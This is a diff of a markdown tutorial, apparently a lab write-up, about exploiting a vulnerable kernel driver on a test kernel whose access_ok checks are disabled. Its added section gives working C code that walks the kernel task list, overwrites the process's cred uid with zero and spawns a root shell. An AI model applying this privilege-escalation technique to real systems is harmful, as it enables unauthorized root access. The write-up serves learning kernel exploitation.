@@ -129,14 +129,14 @@ Error: Bad address
 
 That's not good. If we try to debug the issue, and put a breakpoint in the `device_read` function, we wont stop in that function. It's because we don't even get there. Which means we fail already ad the `read` function in the exploit. Check out the source code of the write syscall.  
 We can find this in `fs/read_write.c`, and the function looks like this:  
-```
+```C
 SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
 {
 	return ksys_read(fd, buf, count);
 }
 ```
 So it's basically just calling  the `ksys_read` function. Let's check it out. We can see, that amongst others this function is calling `vfs_read`:  
-```
+```C
 ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)
 {
 	struct fd f = fdget_pos(fd);
@@ -151,7 +151,7 @@ ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)
 }
 ```
 Vfs_read does again many things, but we see the interesting thing in the first few lines:  
-```
+```C
 ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
 {
 	ssize_t ret;
@@ -168,7 +168,7 @@ ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
  }
  ```
 As we can see, it's returning -EFAULT (which makes errno write Bad address) based on the value of `access_ok`. This macro can be found in `include/asm-generic/uaccess.h`. It checks, if the function sends an address from its memory space. That's what stops us at our exploit. To get around it, we can comment out the if statement in vfs_read (and in vfs_write too), recompile the kernel, and retry the exploit.  
-```
+```C
 //if (unlikely(!access_ok(buf, count)))
 // return -EFAULT;
 ```
@@ -195,14 +195,14 @@ It's working!
 
 ### Cleaning up previous exploit  
 To be able to use our exploit for more than abusing uname, we need to clean the code a little bit. I basically wrote two functions: `read_kernel` and `write_kernel`.  
-```
+```C
 void read_kernel(void *address, const char* buffer, ssize_t size){
         check_fd();
         write_device(FD, address, size);
         read_device(FD, buffer, BUFFER_LEN);
 }
 ```  
-```
+```C
 void write_kernel(void *address, const char* str_to_send, ssize_t size){
         check_fd();
         write_device(FD, str_to_send, size);
@@ -223,6 +223,82 @@ HELLO latsa_kernel 5.11.0 #2 SMP Wed Mar 3 11:40:39 CET 2021 x86_64 GNU/Linux
 ```  
 
 ### Getting root shell  
+
+In order to get root shell, we need to set the credential of our process to root privileges. This can be done by rewriting the creds field of the task_struct of this process. So first we need to find it.  
+We can do it by traversing the linked list of task_struct heads, starting from `init_task`. But of course, these structs are hidden in the kernel address space of the memory, so no user-space program can read them. That's where te kernel driver comes in.  
+To get started, we need to get the address of the `init_taks`. It can be found with this command:  
+```
+# cat /proc/kallsyms | grep init_task
+...
+ffffffff82614940 D init_task
+...
+```  
+We can use this address as a macro in our C code:  
+`#define INIT_TASK 0xffffffff82614940`  
+Next, we need to find offsets in the `task_struct`. We can do this by hand, or with the hand of GDB.  
+```
+(gdb) print (int)&((struct task_struct*)0)->tasks
+$1 = 1000
+(gdb) print (int)&((struct task_struct*)0)->pid
+$2 = 1256
+(gdb) print (int)&((struct task_struct*)0)->cred
+$3 = 1696
+```  
+We need the offset of `tasks`, because by traversing the list of tasks we always get to this offset of the `task_struct`. So, if we need the PID of the task, we need to calculate it like this: `pointer_from_list - offset_of_task + offset_of_pid`. But I later used a more convenient way by calculating the difference between the two offsets. I used the as macros as well:  
+```C
+#define OFFSET_TO_HEAD 0x3e8
+#define OFFSET_TO_PID 0x4e8
+#define HEAD_TO_PID 0x100
+#define OFFSET_TO_CRED 0x6a0
+#define HEAD_TO_CRED 0x2b8
+#define BUFFER_LEN 256
+```  
+With these offsets I could finally start writing the real exploit. First I read the `tasks` field of the `init_task` struct by adding the `tasks` offset to the previously gotten pointer:  
+```C
+void *target = INIT_TASK + OFFSET_TO_HEAD;
+char *buf;
+ 
+read_kernel(target, &buf, sizeof(char*));
+```  
+
+I defined pointer `buf` is used to read the content of target into. It is a char pointer, because it won't mess with pointer arithmetic. If we add 1 to it, it will only jump one byte forwards, not 4 like with an int pointer. So I read the `tasks` field from the `init_task`. Now, to identify our process, we need to get the PID of our process:  
+```C
+int pid = getpid();
+```  
+Then we need to search for this during traversing the list. So lets read the PID field of the task_struct, which is now in buf:  
+```C
+int pid_of_task = 0;
+read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
+``` 
+Now we have all what we need to traverse the task list. This is done in a while loop:  
+```C
+while(pid_of_task != pid){
+    read_kernel(buf, &buf, sizeof(char*));
+    read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
+    printf("\t[+] PID of task: %d\n", pid_of_task);
+}
+```  
+So in this loop I set buf to the address contained by itself, so getting the next element of the list. Then it reads the pid into `pid_of_task`. This is done, while the read PID is not our PID.  
+When this is done, we need to find the `cred` field in this struct:  
+```C
+char *addr_to_task = buf - OFFSET_TO_HEAD;
+printf("[+] Address to our task: %p\n", addr_to_task);
+ 
+char *addr_to_cred;
+read_kernel(buf + HEAD_TO_CRED, &addr_to_cred, sizeof(char*));
+printf("[+] Address to cred: %p\n", addr_to_cred);
+```  
+So we basically calculate the address of the `cred` field, and then read the address of the cred struct from here. After this we can rewrite the uid of this cred struct to 0, thus giving it root privileges:  
+```C
+long long n = 0;
+write_kernel(addr_to_cred, &n, sizeof(long long));
+```
+No we have root privileges. Now we can simply start a root shell:  
+```C
+system("/bin/sh");
+```  
+
+And this is it! This is how it looks in action:  
 
 ```
 # id
